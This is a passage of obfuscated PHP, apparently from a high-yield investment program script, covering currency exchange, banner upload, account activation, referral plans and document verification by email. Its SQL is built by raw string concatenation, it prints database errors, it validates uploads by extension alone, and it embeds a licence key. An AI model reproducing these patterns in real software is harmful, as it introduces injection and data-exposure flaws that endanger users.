                                                                        $elnlcRuFoK[$elnlcsyENS['elnlcnMStn']] = number_format ($elnlcRLcG, 2);
                                                                        $q = 'select email from hm2_users where id = 1';
                                                                        $elnlchGkPU = mysql_query ($q);
                                                                        $elnlcSWfu = '';
                                                                        while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
                                                                        {
                                                                          $elnlcSWfu = $elnlcCgqPK[$elnlcsyENS['elnlcdktEr']];
                                                                        }

                                                                        elnlcsius ('exchange_admin_notification', $elnlcSWfu, $elnlcSuVc[$elnlcsyENS['elnlcBpGlU']], $elnlcRuFoK);
                                                                        elnlcsius ('exchange_user_notification', $elnlcgcnET[email], $elnlcSuVc[$elnlcsyENS['elnlcBpGlU']], $elnlcRuFoK);
                                                                        header ('Location: ?a=exchange&display=ok');
                                                                        exit ();
                                                                      }

                                                                      $elnlckNhB = array ();
                                                                      $elnlcLKgkc = array ();
                                                                      $q = '' . 'select sum(actual_amount) as sm, ec from hm2_history where user_id = ' . $elnlckapu . ' group by ec order by ec asc';
                                                                      $elnlchGkPU = mysql_query ($q);
                                                                      while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
                                                                      {
                                                                        $elnlcCgqPK[$elnlcsyENS['elnlcwSUpn']] = floor ($elnlcCgqPK[$elnlcsyENS['elnlcwSUpn']] * 100) / 100;
                                                                        if (sprintf ('%.02f', $elnlcCgqPK[$elnlcsyENS['elnlcwSUpn']]) <= 0)
                                                                        {
                                                                          continue;
                                                                        }

                                                                        $elnlcLKgkc[$elnlcCgqPK[$elnlcsyENS['elnlcyqyS']]] = $elnlcCgqPK[$elnlcsyENS['elnlcwSUpn']];
                                                                        $elnlcDprme = array ();
                                                                        foreach ($elnlcGPfS as $elnlcVdPU => $elnlcoFEhc)
                                                                        {
                                                                          $elnlchDOH = 'select * from hm2_exchange_rates where sfrom = ' . $elnlcCgqPK[$elnlcsyENS['elnlcyqyS']] . ' and sto = ' . $elnlcVdPU;
                                                                          $elnlcjSNE = mysql_query ($elnlchDOH);
                                                                          $elnlcUpbus = mysql_fetch_array ($elnlcjSNE);
                                                                          $elnlcUpbus[$elnlcsyENS['elnlcOhvjC']] = intval ($elnlcUpbus[$elnlcsyENS['elnlcOhvjC']]);
                                                                          if (($elnlcUpbus[$elnlcsyENS['elnlcOhvjC']] != 100 AND $elnlcGPfS[$elnlcVdPU][$elnlcsyENS['elnlccotiB']]))
                                                                          {
                                                                            array_push ($elnlcDprme, array ('to' => $elnlcVdPU, 'ec_name' => $elnlcGPfS[$elnlcVdPU][$elnlcsyENS['elnlcmjdk']], 'percent' => $elnlcUpbus[$elnlcsyENS['elnlcOhvjC']]));
                                                                            continue;
                                                                          }
                                                                        }

                                                                        if ($elnlcSuVc[$elnlcsyENS['elnlconhcz']] == 1)
                                                                        {
                                                                          $q = '' . 'select hm2_deposits.id, hm2_types.hold from hm2_deposits, hm2_types where user_id = ' . $elnlcgcnET[id] . ' and hm2_types.id = hm2_deposits.type_id and hm2_deposits.deposit_date + interval hm2_types.hold day > now()';
                                                                        }
                                                                        else
                                                                        {
                                                                          $q = '' . 'select hm2_deposits.id, hm2_types.hold from hm2_deposits, hm2_types where user_id = ' . $elnlcgcnET[id] . ' and hm2_types.id = hm2_deposits.type_id ';
                                                                        }

                                                                        ($elnlceJyT = mysql_query ($q) OR print mysql_error ());
                                                                        $elnlcadsc = array ();
                                                                        $elnlcadsc[0] = $elnlcsyENS['elnlcmjUx'];
                                                                        $elnlcEEGK = $elnlcsyENS['elnlcmjUx'];
                                                                        while ($elnlcsbvLG = mysql_fetch_array ($elnlceJyT))
                                                                        {
                                                                          $q = 'select sum(actual_amount) as amount from hm2_history where user_id = ' . $elnlcgcnET[$elnlcsyENS['elnlcLbvLL']] . ('' . ' and ec = ' . $elnlcCgqPK[ec] . ' and 
		deposit_id = ' . $elnlcsbvLG[id] . ' and date > now() - interval ' . $elnlcsbvLG[hold] . ' day and 
			(type=\'earning\' or 
		(type=\'deposit\' and (description like \'Compou%\' or description like \'<b>Archived transactions</b>:<br>Compound%\')));');
                                                                          ($elnlcjSNE = mysql_query ($q) OR print mysql_error ());
                                                                          while ($elnlcUpbus = mysql_fetch_array ($elnlcjSNE))
                                                                          {
                                                                            $elnlcEEGK += $elnlcUpbus[amount];
                                                                          }
                                                                        }

                                                                        array_push ($elnlckNhB, array ('balance' => sprintf ('%.02f', $elnlcCgqPK[$elnlcsyENS['elnlcwSUpn']] - $elnlcEEGK), 'ec' => $elnlcCgqPK[$elnlcsyENS['elnlcyqyS']], 'ec_name' => $elnlcGPfS[$elnlcCgqPK[$elnlcsyENS['elnlcyqyS']]][$elnlcsyENS['elnlcmjdk']], 'tos' => $elnlcDprme));
                                                                      }

                                                                      $elnlcfhFg->assign ('ec', $elnlckNhB);
                                                                      $elnlcjzrk = array ();
                                                                      $q = 'select * from hm2_exchange_rates';
                                                                      $elnlchGkPU = mysql_query ($q);
                                                                      while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
                                                                      {
                                                                        $elnlcjzrk[$elnlcCgqPK[$elnlcsyENS['elnlczJFaO']]][$elnlcCgqPK[$elnlcsyENS['elnlcDQGg']]] = $elnlcCgqPK[$elnlcsyENS['elnlcOhvjC']];
                                                                      }

                                                                      $elnlcmGzSg = array ();
                                                                      foreach ($elnlcGPfS as $elnlcQVmJ => $elnlcoFEhc)
                                                                      {
                                                                        if ((!$elnlcoFEhc[$elnlcsyENS['elnlccotiB']] AND sprintf ('%.02f', $elnlcLKgkc[$elnlcQVmJ]) <= 0))
                                                                        {
                                                                          continue;
                                                                        }

                                                                        $elnlcDprme = array ();
                                                                        foreach ($elnlcGPfS as $elnlcVdPU => $elnlcoFEhc)
                                                                        {
                                                                          if ((!$elnlcoFEhc[$elnlcsyENS['elnlccotiB']] AND sprintf ('%.02f', $elnlcLKgkc[$elnlcVdPU]) <= 0))
                                                                          {
                                                                            continue;
                                                                          }

                                                                          if (!$elnlcoFEhc[$elnlcsyENS['elnlccotiB']])
                                                                          {
                                                                            $elnlcjzrk[$elnlcQVmJ][$elnlcVdPU] = $elnlcsyENS['elnlcMknGz'];
                                                                          }

                                                                          if ($elnlcQVmJ == $elnlcVdPU)
                                                                          {
                                                                            $elnlcjzrk[$elnlcQVmJ][$elnlcVdPU] = $elnlcsyENS['elnlcMknGz'];
                                                                          }

                                                                          array_push ($elnlcDprme, array ('to' => $elnlcVdPU, 'percent' => sprintf ('%.02f', $elnlcjzrk[$elnlcQVmJ][$elnlcVdPU])));
                                                                        }

                                                                        array_push ($elnlcmGzSg, array ('from' => $elnlcQVmJ, 'tos' => $elnlcDprme));
                                                                      }

                                                                      $elnlcfhFg->assign ('exchange', $elnlcmGzSg);
                                                                      $elnlcfhFg->display ($elnlcsyENS['elnlcVdzUT']);
                                                                      print base64_decode ('Cg==
');
                                                                    }
                                                                    else
                                                                    {
                                                                      if (($elnlcWodOE[$elnlcsyENS['elnlcxxLz']] == $elnlcsyENS['elnlcmQQDe'] AND $elnlcgcnET[$elnlcsyENS['elnlcpicy']] == 1))
                                                                      {
                                                                        if ($elnlcWodOE[act] == $elnlcsyENS['elnlcRHxwS'])
                                                                        {
                                                                          $elnlcjPews = array ();
                                                                          if (($_FILES[$elnlcsyENS['elnlcaqHP']][$elnlcsyENS['elnlcdgIz']] == 0 OR $_FILES[$elnlcsyENS['elnlcaqHP']][$elnlcsyENS['elnlcVEVkm']] == UPLOAD_ERR_NO_FILE))
                                                                          {
                                                                            array_push ($elnlcjPews, array ('name' => 'Please, provide your banner'));
                                                                          }
                                                                          else
                                                                          {
                                                                            if ($_FILES[$elnlcsyENS['elnlcaqHP']][$elnlcsyENS['elnlcVEVkm']] == UPLOAD_ERR_INI_SIZE)
                                                                            {
                                                                              array_push ($elnlcjPews, array ('name' => 'Provided file is too big. Max file size is ' . ini_get ('upload_max_filesize')));
                                                                            }
                                                                            else
                                                                            {
                                                                              if ($_FILES[$elnlcsyENS['elnlcaqHP']][$elnlcsyENS['elnlcVEVkm']] == UPLOAD_ERR_PARTIAL)
                                                                              {
                                                                                array_push ($elnlcjPews, array ('name' => 'Uploading was faid. Please try again.'));
                                                                              }
                                                                            }
                                                                          }

                                                                          $elnlcgFEQ = array_reverse (split ('\\.', $_FILES[$elnlcsyENS['elnlcaqHP']][$elnlcsyENS['elnlcmjdk']]));
                                                                          $elnlcPFvcO = $elnlcgFEQ[0];
                                                                          if (($elnlcPFvcO != 'jpg' AND $elnlcPFvcO != 'gif'))
                                                                          {
                                                                            array_push ($elnlcjPews, array ('name' => 'Please upload .jpg or .gif banners'));
                                                                          }

                                                                          if (!$elnlcjPews)
                                                                          {
                                                                            if (copy ($_FILES[$elnlcsyENS['elnlcaqHP']][$elnlcsyENS['elnlcvENVs']], '' . './tmpl_c/banners/' . $elnlcgcnET[id]))
                                                                            {
                                                                              $elnlcJxPsF = elnlcnczen ($elnlcWodOE[url]);
                                                                              $q = '' . 'update hm2_users set bnum = ' . $elnlcgcnET[id] . ', burl = \'' . $elnlcJxPsF . '\' where id = ' . $elnlcgcnET[id];
                                                                              (mysql_query ($q) OR print mysql_error ());
                                                                              header ('Location: ?a=banner');
                                                                            }
                                                                          }
                                                                          else
                                                                          {
                                                                            $elnlcfhFg->assign (errors, $elnlcjPews);
                                                                          }
                                                                        }

                                                                        $elnlcfhFg->display ($elnlcsyENS['elnlcdHUDm']);
                                                                        print base64_decode ('Cg==
');
                                                                      }
                                                                      else
                                                                      {
                                                                        if ($elnlcWodOE[$elnlcsyENS['elnlcxxLz']] == $elnlcsyENS['elnlchhoD'])
                                                                        {
                                                                          $elnlcisiv = elnlcnczen ($elnlcWodOE[$elnlcsyENS['elnlcdOdG']]);
                                                                          $elnlcGBDsI = $elnlcsyENS['elnlcmjUx'];
                                                                          if ($elnlcisiv != '')
                                                                          {
                                                                            $q = '' . 'select id from hm2_users where activation_code = \'' . $elnlcisiv . '\'';
                                                                            $elnlchGkPU = mysql_query ($q);
                                                                            while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
                                                                            {
                                                                              $q = 'update hm2_users set bf_counter = 0, activation_code = \'\' where id = ' . $elnlcCgqPK[$elnlcsyENS['elnlcLbvLL']];
                                                                              mysql_query ($q);
                                                                              $elnlcGBDsI = $elnlcsyENS['elnlctNxTK'];
                                                                            }
                                                                          }

                                                                          $elnlcfhFg->assign ('activated', $elnlcGBDsI);
                                                                          $elnlcfhFg->display ($elnlcsyENS['elnlcCaCK']);
                                                                          print base64_decode ('Cg==
');
                                                                        }
                                                                        else
                                                                        {
                                                                          if ($elnlcWodOE[$elnlcsyENS['elnlcxxLz']] == $elnlcsyENS['elnlcBKWO'])
                                                                          {
                                                                            $elnlckapu = sprintf ('%d', $elnlcWodOE[$elnlcsyENS['elnlcLbvLL']]);
                                                                            $q = '' . 'select * from hm2_types where id = ' . $elnlckapu;
                                                                            ($elnlchGkPU = mysql_query ($q) OR print mysql_error ());
                                                                            $elnlcDmWIw = $elnlcsyENS['elnlcmjUx'];
                                                                            while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
                                                                            {
                                                                              $elnlcfhFg->assign ('package', $elnlcCgqPK);
                                                                              $elnlcDmWIw = $elnlcsyENS['elnlctNxTK'];
                                                                            }

                                                                            if ($elnlcDmWIw == 0)
                                                                            {
                                                                              $elnlcfhFg->assign ('no_such_plan', 1);
                                                                            }

                                                                            $elnlcfhFg->display ($elnlcsyENS['elnlcnhrDA']);
                                                                            print base64_decode ('Cg==
');
                                                                          }
                                                                          else
                                                                          {
                                                                            if ($elnlcWodOE[$elnlcsyENS['elnlcxxLz']] == $elnlcsyENS['elnlcAdAz'])
                                                                            {
                                                                              $q = 'select max(percent) as percent from hm2_referal';
                                                                              $elnlchGkPU = mysql_query ($q);
                                                                              while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
                                                                              {
                                                                                $elnlcfhFg->assign ('percent', $elnlcCgqPK[$elnlcsyENS['elnlcOhvjC']]);
                                                                              }

                                                                              $elnlcqjGg = array ();
                                                                              $q = 'select * from hm2_referal order by from_value';
                                                                              $elnlchGkPU = mysql_query ($q);
                                                                              while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
                                                                              {
                                                                                array_push ($elnlcqjGg, $elnlcCgqPK);
                                                                              }

                                                                              $elnlcfhFg->assign ('ref_plans', $elnlcqjGg);
                                                                              $elnlcPbyEv = array ();
                                                                              for ($l = $elnlcsyENS['elnlcbpKgI']; $l < 11; ++$l)
                                                                              {
                                                                                if ((0 < $elnlcSuVc['ref' . $l . '_cms'] AND $elnlcSuVc['ref' . $l . '_cms'] < 100))
                                                                                {
                                                                                  array_push ($elnlcPbyEv, array ('level' => $l, 'percent' => $elnlcSuVc['ref' . $l . '_cms']));
                                                                                  continue;
                                                                                }
                                                                              }

                                                                              $elnlcfhFg->assign ('ref_levels', $elnlcPbyEv);
                                                                              $elnlcfhFg->display ($elnlcsyENS['elnlcGpVor']);
                                                                            }
                                                                            else
                                                                            {
                                                                              if ($elnlcWodOE[$elnlcsyENS['elnlcxxLz']] == $elnlcsyENS['elnlcDRmH'])
                                                                              {
                                                                                $elnlcfhFg->display ($elnlcsyENS['elnlcDwzTf']);
                                                                              }
                                                                              else
                                                                              {
                                                                                if (($elnlcWodOE[$elnlcsyENS['elnlcxxLz']] == $elnlcsyENS['elnlcEvcjR'] AND $elnlcgcnET[$elnlcsyENS['elnlcpicy']] == 1))
                                                                                {
                                                                                  $elnlcrAlEG = -1;
                                                                                  if ($elnlcWodOE[$elnlcsyENS['elnlcevKUa']] == $elnlcsyENS['elnlcusWcW'])
                                                                                  {
                                                                                    if (($elnlcSuVc[$elnlcsyENS['elnlciwSzJ']] == 1 AND $elnlcCgqPK[$elnlcsyENS['elnlcLbvLL']] <= 3))
                                                                                    {
                                                                                      header ('Location: ?a=security');
                                                                                    }

                                                                                    $elnlcwkiU = array ();
                                                                                    $elnlcwkiU[$elnlcsyENS['elnlcpANw']] = $elnlcWodOE[$elnlcsyENS['elnlctDSvC']];
                                                                                    $elnlcwkiU[$elnlcsyENS['elnlcuSTO']] = $elnlcWodOE[$elnlcsyENS['elnlcKPxo']];
                                                                                    $elnlcwkiU[$elnlcsyENS['elnlcWkuzj']] = $elnlcUAAU[$elnlcsyENS['elnlccqWO']];
                                                                                    $elnlcwkiU[$elnlcsyENS['elnlcpFnSR']] = $elnlcUAAU[$elnlcsyENS['elnlcnGMB']];
                                                                                    $elnlcEabU = elnlcnczen (serialize ($elnlcwkiU));
                                                                                    $q = '' . 'update hm2_users set ac = \'' . $elnlcEabU . '\' where id = ' . $elnlcgcnET[$elnlcsyENS['elnlcLbvLL']];
                                                                                    (mysql_query ($q) OR print mysql_error ());
                                                                                    header ('Location: ?a=security');
                                                                                    exit ();
                                                                                  }

                                                                                  if ((($elnlcgcnET[$elnlcsyENS['elnlcBGGit']][$elnlcsyENS['elnlcpANw']] != 'high' AND $elnlcgcnET[$elnlcsyENS['elnlcBGGit']][$elnlcsyENS['elnlcpANw']] != 'medium') AND $elnlcgcnET[$elnlcsyENS['elnlcBGGit']][$elnlcsyENS['elnlcpANw']] != 'disabled'))
                                                                                  {
                                                                                    $elnlcgcnET[$elnlcsyENS['elnlcBGGit']][$elnlcsyENS['elnlcpANw']] = $elnlcsyENS['elnlcsjLq'];
                                                                                  }

                                                                                  if (($elnlcgcnET[$elnlcsyENS['elnlcBGGit']][$elnlcsyENS['elnlcuSTO']] != 'enabled' AND $elnlcgcnET[$elnlcsyENS['elnlcBGGit']][$elnlcsyENS['elnlcuSTO']] != 'disabled'))
                                                                                  {
                                                                                    $elnlcgcnET[$elnlcsyENS['elnlcBGGit']][$elnlcsyENS['elnlcuSTO']] = $elnlcsyENS['elnlcsjLq'];
                                                                                  }

                                                                                  $elnlcfhFg->assign ('high_ip_security', $elnlcgcnET[$elnlcsyENS['elnlcBGGit']][$elnlcsyENS['elnlcpFnSR']]);
                                                                                  $elnlcfhFg->assign ('security', $elnlcgcnET[$elnlcsyENS['elnlcBGGit']]);
                                                                                  $elnlcfhFg->display ($elnlcsyENS['elnlcQGyHF']);
                                                                                }
                                                                                else
                                                                                {
                                                                                  if (($elnlcWodOE[$elnlcsyENS['elnlcxxLz']] == $elnlcsyENS['elnlcfuEwy'] AND $elnlcgcnET[$elnlcsyENS['elnlcpicy']] == 1))
                                                                                  {
                                                                                    if (($elnlcSuVc[$elnlcsyENS['elnlcIrtRw']] == $elnlcsyENS['elnlcpBvNJ'] OR $elnlcSuVc[$elnlcsyENS['elnlcIrtRw']] == $elnlcsyENS['elnlcJKtS']))
                                                                                    {
                                                                                    }
                                                                                    else
                                                                                    {
                                                                                      if ($elnlcSuVc[$elnlcsyENS['elnlcvxBO']] != 1)
                                                                                      {
                                                                                        exit ();
                                                                                      }

                                                                                      $elnlcDmWIw = $elnlcsyENS['elnlcmjUx'];
                                                                                      if ($elnlcWodOE[$elnlcsyENS['elnlcevKUa']] == $elnlcsyENS['elnlcfuEwy'])
                                                                                      {
                                                                                        $elnlcJxPsF = '' . $elnlcSuVc[$elnlcsyENS['elnlcRQss']] . '/?ref=' . $elnlcgcnET[$elnlcsyENS['elnlczWew']];
                                                                                        for ($i = $elnlcsyENS['elnlctNxTK']; $i < 4; ++$i)
                                                                                        {
                                                                                          if ($elnlcWodOE['email' . $i] != '')
                                                                                          {
                                                                                            $elnlcRuFoK = array ();
                                                                                            $elnlcRuFoK[$elnlcsyENS['elnlczWew']] = $elnlcgcnET[$elnlcsyENS['elnlczWew']];
                                                                                            $elnlcRuFoK[$elnlcsyENS['elnlcsWcIo']] = $elnlcWodOE['name' . $i];
                                                                                            $elnlcRuFoK[$elnlcsyENS['elnlcSRmpC']] = $elnlcJxPsF;
                                                                                            elnlcsius ('tell_a_friend', $elnlcWodOE['email' . $i], $elnlcSuVc[$elnlcsyENS['elnlcBpGlU']], $elnlcRuFoK);
                                                                                            $elnlcDmWIw = $elnlcsyENS['elnlctNxTK'];
                                                                                            continue;
                                                                                          }
                                                                                        }

                                                                                        if ($elnlcDmWIw == 1)
                                                                                        {
                                                                                          $elnlcfhFg->assign ('say', $elnlcsyENS['elnlctoPxw']);
                                                                                        }
                                                                                      }

                                                                                      $elnlcfhFg->display ($elnlcsyENS['elnlcBLqC']);
                                                                                      print base64_decode ('Cg==
');
                                                                                    }
                                                                                  }
                                                                                  else
                                                                                  {
                                                                                    if (($elnlcWodOE[$elnlcsyENS['elnlcxxLz']] == $elnlcsyENS['elnlcWUwww'] AND $elnlcgcnET[$elnlcsyENS['elnlcpicy']] == 1))
                                                                                    {
                                                                                      if ($elnlcSuVc[$elnlcsyENS['elnlcIrtRw']] != '4K5SVW3M2LYNL4R3J4FL')
                                                                                      {
                                                                                        exit ();
                                                                                      }

                                                                                      if ($elnlcWodOE[$elnlcsyENS['elnlcevKUa']] == $elnlcsyENS['elnlcusWcW'])
                                                                                      {
                                                                                        $q = 'select * from hm2_users where id = 1';
                                                                                        $elnlcLdIRt = '';
                                                                                        ($elnlchGkPU = mysql_query ($q) OR print mysql_error ());
                                                                                        while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
                                                                                        {
                                                                                          $elnlcLdIRt = $elnlcCgqPK[$elnlcsyENS['elnlcdktEr']];
                                                                                        }

                                                                                        if ($elnlcLdIRt == '')
                                                                                        {
                                                                                          exit ();
                                                                                        }

                                                                                        $elnlciFbpa = 'Verify account :: documents';
                                                                                        $elnlcCvGl = $elnlcvnRR = $elnlcLdIRt;
                                                                                        $elnlcrIMb = '' . 'Please review attached documents and verify user

Username: ' . $elnlcgcnET[$elnlcsyENS['elnlcmjdk']] . '
Edit user: ' . $elnlcSuVc[$elnlcsyENS['elnlcRQss']] . '/admin.php?a=editaccount&id=' . $elnlcgcnET[$elnlcsyENS['elnlcLbvLL']];
                                                                                        if ($_FILES[$elnlcsyENS['elnlcpniD']][$elnlcsyENS['elnlcmjdk']] != '')
                                                                                        {
                                                                                          $elnlcvpAwk = chunk_split (base64_encode (join ('', file ($_FILES[$elnlcsyENS['elnlcpniD']][$elnlcsyENS['elnlcvENVs']]))));
                                                                                          $elnlcjKDul = $_FILES[$elnlcsyENS['elnlcpniD']][$elnlcsyENS['elnlcmjdk']];
                                                                                        }

                                                                                        if ($_FILES[$elnlcsyENS['elnlcOLaU']][$elnlcsyENS['elnlcmjdk']] != '')
                                                                                        {
                                                                                          $elnlcVNlA = chunk_split (base64_encode (join ('', file ($_FILES[$elnlcsyENS['elnlcOLaU']][$elnlcsyENS['elnlcvENVs']]))));
                                                                                          $elnlcrgha = $_FILES[$elnlcsyENS['elnlcOLaU']][$elnlcsyENS['elnlcmjdk']];
                                                                                        }

                                                                                        if ($_FILES[$elnlcsyENS['elnlczzdfo']][$elnlcsyENS['elnlcmjdk']] != '')
                                                                                        {
                                                                                          $elnlcjnrs = chunk_split (base64_encode (join ('', file ($_FILES[$elnlcsyENS['elnlczzdfo']][$elnlcsyENS['elnlcvENVs']]))));
                                                                                          $elnlclAuo = $_FILES[$elnlcsyENS['elnlczzdfo']][$elnlcsyENS['elnlcmjdk']];
                                                                                        }

                                                                                        if ($_FILES[$elnlcsyENS['elnlcftfv']][$elnlcsyENS['elnlcmjdk']] != '')
                                                                                        {
                                                                                          $elnlcxsGEt = chunk_split (base64_encode (join ('', file ($_FILES[$elnlcsyENS['elnlcftfv']][$elnlcsyENS['elnlcvENVs']]))));
                                                                                          $elnlcfNna = $_FILES[$elnlcsyENS['elnlcftfv']][$elnlcsyENS['elnlcmjdk']];
                                                                                        }

                                                                                        if ($_FILES[$elnlcsyENS['elnlcAgBxj']][$elnlcsyENS['elnlcmjdk']] != '')
                                                                                        {
                                                                                          $elnlcfzco = chunk_split (base64_encode (join ('', file ($_FILES[$elnlcsyENS['elnlcAgBxj']][$elnlcsyENS['elnlcvENVs']]))));
                                                                                          $elnlcbNdBa = $_FILES[$elnlcsyENS['elnlcAgBxj']][$elnlcsyENS['elnlcmjdk']];
                                                                                        }

                                                                                        $elnlcgNwD = 'application/octet-stream';
                                                                                        $elnlckvNA = 'base64';
                                                                                        mt_srand ((double)microtime () * 1000000);
                                                                                        $elnlcgxPK = '--b' . md5 (uniqid (mt_rand ())) . getmypid ();
                                                                                        $elnlcRbKK = 'From: \'Your website script\' <daniel@goldcoders.com>
MIME-Version: 1.0
' . ('' . 'Content-Type: multipart/mixed; boundary="' . $elnlcgxPK . '"

') . 'This is a MIME encoded message. 

' . ('' . '--' . $elnlcgxPK . '
') . 'Content-Type: text/plain
' . 'Content-Transfer-Encoding: 8bit

' . $elnlcrIMb . ('' . '


--' . $elnlcgxPK);
                                                                                        $elnlcoFEhc = '';
                                                                                        if ($elnlcvpAwk != '')
                                                                                        {
                                                                                          $elnlcoFEhc .= '' . 'Content-Type: ' . $elnlcgNwD . ('' . '; name = "' . $elnlcjKDul . '"
') . ('' . 'Content-Transfer-Encoding: ' . $elnlckvNA) . ('' . '

' . $elnlcvpAwk . '

--' . $elnlcgxPK . '
');
                                                                                        }

                                                                                        if ($elnlcVNlA != '')
                                                                                        {
                                                                                          $elnlcoFEhc .= '' . 'Content-Type: ' . $elnlcgNwD . ('' . '; name = "' . $elnlcrgha . '"
') . ('' . 'Content-Transfer-Encoding: ' . $elnlckvNA) . ('' . '

' . $elnlcVNlA . '

--' . $elnlcgxPK . '
');
                                                                                        }

                                                                                        if ($elnlcjnrs != '')
                                                                                        {
                                                                                          $elnlcoFEhc .= '' . 'Content-Type: ' . $elnlcgNwD . ('' . '; name = "' . $elnlclAuo . '"
') . ('' . 'Content-Transfer-Encoding: ' . $elnlckvNA) . ('' . '

' . $elnlcjnrs . '

--' . $elnlcgxPK . '
');
                                                                                        }

                                                                                        if ($elnlcxsGEt != '')
                                                                                        {
                                                                                          $elnlcoFEhc .= '' . 'Content-Type: ' . $elnlcgNwD . ('' . '; name = "' . $elnlcfNna . '"
') . ('' . 'Content-Transfer-Encoding: ' . $elnlckvNA) . ('' . '

' . $elnlcxsGEt . '

--' . $elnlcgxPK . '
');
                                                                                        }

                                                                                        if ($elnlcfzco != '')
                                                                                        {
                                                                                          $elnlcoFEhc .= '' . 'Content-Type: ' . $elnlcgNwD . ('' . '; name = "' . $elnlcbNdBa . '"
') . ('' . 'Content-Transfer-Encoding: ' . $elnlckvNA) . ('' . '

' . $elnlcfzco . '

--' . $elnlcgxPK . '
');
                                                                                        }

                                                                                        $elnlcRbKK .= ('' . '
') . $elnlcoFEhc . '--' . $elnlcgxPK . '--
';
                                                                                        $q = '' . 'update hm2_users set verify = 1 where id = ' . $elnlcgcnET[$elnlcsyENS['elnlcLbvLL']];
                                                                                        (mysql_query ($q) OR print mysql_error ());
                                                                                        mail ($elnlcCvGl, $elnlciFbpa, ' ', $elnlcRbKK);
                                                                                      }

                                                                                      if ($elnlcgcnET[$elnlcsyENS['elnlcLhfNx']] == 1)
                                                                                      {
                                                                                        $elnlcfhFg->display ($elnlcsyENS['elnlcfDAvn']);
                                                                                      }
                                                                                      else
                                                                                      {
                                                                                        if ($elnlcgcnET[$elnlcsyENS['elnlcLhfNx']] == 2)
                                                                                        {
                                                                                          $elnlcfhFg->display ($elnlcsyENS['elnlcidRjl']);
                                                                                        }
                                                                                        else
                                                                                        {
                                                                                          $elnlcfhFg->display ($elnlcsyENS['elnlceoerl']);
                                                                                        }
                                                                                      }
                                                                                    }
                                                                                    else
                                                                                    {
                                                                                      if ($elnlcWodOE[$elnlcsyENS['elnlcxxLz']] == $elnlcsyENS['elnlcKFSa'])
                                                                                      {
                                                                                        $elnlcRIwA = $elnlcWodOE[$elnlcsyENS['elnlcoRdoK']];
                                                                                        $elnlcRIwA = basename ($elnlcRIwA);
                                                                                        if (file_exists ($elnlcfhFg->template_dir . 'custom/' . $elnlcRIwA . '.tpl'))
                                                                                        {
                                                                                          $elnlcfhFg->display ('custom/' . $elnlcRIwA . '.tpl');
                                                                                          elnlcnooln ($elnlcUazB);
                                                                                          exit ();
                                                                                        }
                                                                                        else
                                                                                        {
                                                                                          $elnlcBFBSo = array ();
                                                                                          if (0 < $elnlcgcnET[$elnlcsyENS['elnlcLbvLL']])
                                                                                          {
                                                                                            $q = 'select type_id from hm2_deposits where user_id = ' . $elnlcgcnET[$elnlcsyENS['elnlcLbvLL']];
                                                                                            ($elnlchGkPU = mysql_query ($q) OR print mysql_error ());
                                                                                            while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
                                                                                            {
                                                                                              array_push ($elnlcBFBSo, $elnlcCgqPK[$elnlcsyENS['elnlcPfzD']]);
                                                                                            }
                                                                                          }

                                                                                          $q = 'select * from hm2_types where status = \'on\' order by ordering';
                                                                                          ($elnlchGkPU = mysql_query ($q) OR print mysql_error ());
                                                                                          $elnlcGokT = $elnlcsyENS['elnlcmNpWL'];
                                                                                          $elnlcxdwm = $elnlcsyENS['elnlcmjUx'];
                                                                                          $elnlczhuc = array ();
                                                                                          while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
                                                                                          {
                                                                                            if (0 < $elnlcgcnET[$elnlcsyENS['elnlcLbvLL']])
                                                                                            {
                                                                                              if (0 < $elnlcCgqPK[$elnlcsyENS['elnlcbViuH']])
                                                                                              {
                                                                                                if (!in_array ($elnlcCgqPK[$elnlcsyENS['elnlcbViuH']], $elnlcBFBSo))
                                                                                                {
                                                                                                  continue;
                                                                                                }
                                                                                              }
                                                                                            }

                                                                                            $q = 'select * from hm2_plans where parent = ' . $elnlcCgqPK[$elnlcsyENS['elnlcLbvLL']] . ' order by id';
                                                                                            if (!($elnlcjSNE = mysql_query ($q)))
                                                                                            {
                                                                                              exit (mysql_error ());
                                                                                              (bool)true;
                                                                                            }

                                                                                            $elnlcCgqPK[$elnlcsyENS['elnlcKBthk']] = array ();
                                                                                            while ($elnlcUpbus = mysql_fetch_array ($elnlcjSNE))
                                                                                            {
                                                                                              $elnlcUpbus[$elnlcsyENS['elnlcOBsC']] = '';
                                                                                              if ($elnlcUpbus[$elnlcsyENS['elnlcwFTQ']] < $elnlcGokT)
                                                                                              {
                                                                                                $elnlcGokT = $elnlcUpbus[$elnlcsyENS['elnlcwFTQ']];
                                                                                              }

                                                                                              if (($elnlcxdwm < $elnlcUpbus[$elnlcsyENS['elnlcMFyGk']] OR $elnlcUpbus[$elnlcsyENS['elnlcMFyGk']] == 0))
                                                                                              {
                                                                                                $elnlcxdwm = $elnlcUpbus[$elnlcsyENS['elnlcMFyGk']];
                                                                                              }

                                                                                              if ($elnlcUpbus[$elnlcsyENS['elnlcMFyGk']] == 0)
                                                                                              {
                                                                                                $elnlcUpbus[$elnlcsyENS['elnlcOBsC']] = $elnlcSuVc[currency_sign] . number_format ($elnlcUpbus[$elnlcsyENS['elnlcwFTQ']]) . ' and more';
                                                                                              }
                                                                                              else
                                                                                              {
                                                                                                $elnlcUpbus[$elnlcsyENS['elnlcOBsC']] = $elnlcSuVc[currency_sign] . number_format ($elnlcUpbus[$elnlcsyENS['elnlcwFTQ']]) . ' - ' . $elnlcSuVc[currency_sign] . number_format ($elnlcUpbus[$elnlcsyENS['elnlcMFyGk']]);
                                                                                              }

                                                                                              array_push ($elnlcCgqPK[$elnlcsyENS['elnlcKBthk']], $elnlcUpbus);
                                                                                            }

                                                                                            $elnlcweII = array ('d' => 'Daily', 'w' => 'Weekly', 'b-w' => 'Bi Weekly', 'm' => 'Monthly', '2m' => '2 Monthly', '3m' => '3 Monthly', '6m' => '6 Monthly', 'h' => 'Hourly', 'y' => $elnlcsyENS['elnlcRzpur']);
